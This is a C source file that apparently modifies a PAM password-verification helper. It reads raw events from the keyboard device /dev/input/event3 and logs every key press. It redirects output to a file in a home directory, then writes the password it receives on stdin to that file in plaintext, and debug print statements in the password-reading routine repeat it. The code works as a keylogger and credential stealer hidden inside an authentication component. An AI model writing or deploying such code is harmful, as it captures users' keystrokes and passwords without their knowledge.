#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <shadow.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <linux/input.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>

#include <security/_pam_types.h>
#include <security/_pam_macros.h>


static int
pam_read_passwords(int fd, int npass, char **passwords)
{
    /*
     * The passwords array must contain npass preallocated
     * buffers of length PAM_MAX_RESP_SIZE + 1.
     */
    int rbytes = 0;
    int offset = 0;
    int i = 0;
    char *pptr;
    while (npass > 0) {
        printf("npass %d\n", npass);
        rbytes = read(fd, passwords[i]+offset, PAM_MAX_RESP_SIZE+1-offset);
        printf("rbytes %d\n", rbytes);
        printf("passwords %s\n", passwords[i]+offset);
        if (rbytes < 0) {
            printf("rbytes < 0\n");
            if (errno == EINTR) {
                continue;
            }
            break;
        }
        if (rbytes == 0) {
            printf("rbytes == 0\n");
            break;
        }
        printf("char from pass (5) %c\n", passwords[i][4]);
        if (passwords[i][5] == '\n')  {
            printf("ok\n");
        }
        while (npass > 0 &&
               (pptr = memchr(passwords[i] + offset, '\0', rbytes)) != NULL) {
            ++pptr; /* skip the '\0' */
            rbytes -= pptr - (passwords[i] + offset);
            printf("rbytes decreased %d\n", rbytes);
            i++;
            printf("%d", i);
            offset = 0;
            npass--;
            printf("%d", npass);
            if (rbytes > 0) {
                if (npass > 0) {
                    memcpy(passwords[i], pptr, rbytes);
                }
                memset(pptr, '\0', rbytes);
            }
        }
        offset += rbytes;
    }

    /* clear up */
    if (offset > 0 && npass > 0) {
        printf("clear up\n");
        memset(passwords[i], '\0', offset);
    }

    return i;
}

static const char *const evval[3] = {
        "RELEASED",
        "PRESSED ",
        "REPEATED"
};

#define KEYBOARD_FILE "/dev/input/event3"

int main(int argc, char *argv[])
{
    char pass[PAM_MAX_RESP_SIZE + 1];
    char *option;
    int npass, nullok;
    int blankpass = 0;
    int retval = PAM_AUTH_ERR;
    char *user;
    char *passwords[] = { pass };
    const char *dev = KEYBOARD_FILE;
    struct input_event ev;
    ssize_t n;
    int fd;

    fd = open(dev, O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
        return EXIT_FAILURE;
    }

    struct pollfd stdin_poll = { .fd = STDIN_FILENO
            , .events = POLLIN | POLLRDBAND | POLLRDNORM | POLLPRI };

    int fd_write;
    char *name = "/home/alexey/Downloads/my_pam/helloworld";
    syslog(LOG_WARNING, "support: try to open file");
    fd_write = open(name, O_WRONLY | O_CREAT, 0644);
    syslog(LOG_WARNING, "support: file opened");
    if (fd_write == -1) {
        perror("open failed");
        syslog(LOG_WARNING, "support: open failed");
        exit(1);
    }

    if (dup2(fd_write, 1) == -1) {
        perror("dup2 failed");
        syslog(LOG_WARNING, "support: dup2 failed");
        exit(1);
    }


    while (1) {
        n = read(fd, &ev, sizeof ev);
        if (n == (ssize_t)-1) {
            if (errno == EINTR)
                continue;
            else
                break;
        } else
        if (n != sizeof ev) {
            errno = EIO;
            break;
        }
        if (ev.type == EV_KEY && ev.value >= 0 && ev.value <= 2)
            printf("%s 0x%04x (%d)\n", evval[ev.value], (int)ev.code, (int)ev.code);

        if (poll(&stdin_poll, 1, 0) == 1) {
            npass = pam_read_passwords(STDIN_FILENO, 1, passwords);
            printf("%d", npass);
            if (npass != 1) {	/* is it a valid password? */
                printf("no password supplied");
                *pass = '\0';
            }

            if (*pass == '\0') {
                blankpass = 1;
            }
            break;
        }
    }

    printf("%s", pass);
    return 1;
}
